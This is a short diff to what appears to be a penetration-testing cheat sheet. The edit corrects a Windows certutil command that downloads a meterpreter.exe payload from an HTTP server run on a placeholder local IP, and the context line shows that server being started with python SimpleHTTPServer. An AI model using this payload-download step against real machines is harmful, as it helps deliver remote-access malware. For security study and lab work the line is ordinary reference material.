@@ -2464,7 +2464,7 @@ sudo python -m SimpleHTTPServer 80
 > Command to start a simple `HTTP File Server`.
 
 ```CMD
-certutil -url http://<local-ip>/meterpreter.exe meterpreter.exe
+certutil -urlcache -f http://<local-IP>/meterpreter.exe meterpreter.exe
 ```
 
 > This can be used to download the file from the HTTP server with accessing the browser.
